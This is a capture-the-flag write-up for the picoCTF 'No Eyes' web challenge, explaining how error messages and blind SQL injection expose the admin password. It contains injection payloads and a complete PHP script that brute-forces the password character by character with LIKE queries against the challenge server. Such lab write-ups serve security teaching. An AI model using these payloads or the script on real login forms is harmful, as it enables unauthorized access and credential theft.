# No Eyes - 125 Points

The [website](http://shell2017.picoctf.com:40788/) isn't really me much, but you can still get the admin password, right?

**Hint:** Sometimes an error message can be just as useful.

## Writeup

Like the previous problem, we want to find the admin user's password. So, we can start by trying to login in as admin using the username "admin" and a password of `' or 1=1 --`. This logs us in, but all it does is display an error message: `Login Functionality Not Complete. Flag is 63 characters`. This doesn't tell us much, but at least know we know the length of the flag. Let's keep searching for more information. We can get try to get the website to give us more error messages by breaking their SQL query. Submitting a username of `'` sucessfully does just that and gives us the broken query in an error message: `select * from users where user = ''';`. Now we know there is a `users` table which contains the column `user` for usernames. If we try the same thing with the password field (using "admin" as username and the single quote as password), we get another query: `select * from users where pass = ''';`. So the website first searches the `users` table for a username (user column) then tries to find a matching entry for a password (pass column) and we know that there is an entry for admin with a password that is 63 characters long. What next? Brute force of course!

SQL has a `LIKE` operator that checks if a column matches a certain pattern. The pattern we're going to use looks like `a%`, meaning find any values that start with "a". To brute force the password, I wrote a script in PHP that queries the website with a password like `' union select * from users where pass like 'a%' --` that tries different characters until it successfully logs in then goes on to try the next character in the password until it gets to a length of 63. To check if the login is successful, I utilize a [PHP to HTML parser](https://github.com/paquettg/php-html-parser) that checks the error message in the HTML page it receives. However, there are other ways to check this if you don't want to download a whole framework. Furthermore, if you are unfamiliar with PHP other languages such as Python can be used instead.

```PHP
<?php

	require "vendor/autoload.php";
	use PHPHtmlParser\Dom;

	$i = 0;
	$stuff = "";
	$failText = "Incorrect Password.";
	$chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_abcdefghijklmnopqrstuvwxyz{}?!.@#$%^&*()~-+=,;\"'";
	$ans = "";


	while ($i++ < strlen($chars) && strlen($ans) < 63)
	{

		$char = substr($chars, $i-1, 1);

		$c = curl_init();

		curl_setopt($c, CURLOPT_URL, "http://shell2017.picoctf.com:40788/");
		curl_setopt($c, CURLOPT_POST, 1);
		curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($c, CURLOPT_POSTFIELDS, "username=admin&password=asd' union select * from users where pass like '" . $ans . $char . "%");

		$stuff = curl_exec($c);

		$dom = new Dom;
		$dom->load($stuff);
		$alert = $dom->find(".container .row .alert strong")[0]->text;

		if ($alert != $failText)
		{
			echo $char;
			$ans .= $char;
			$i = 0;

		}

		curl_close($c);
	}

	echo "<br />" . $ans;

?>
```

## Helpful Resources

[https://www.w3schools.com/sql/sql_like.asp](https://www.w3schools.com/sql/sql_like.asp)
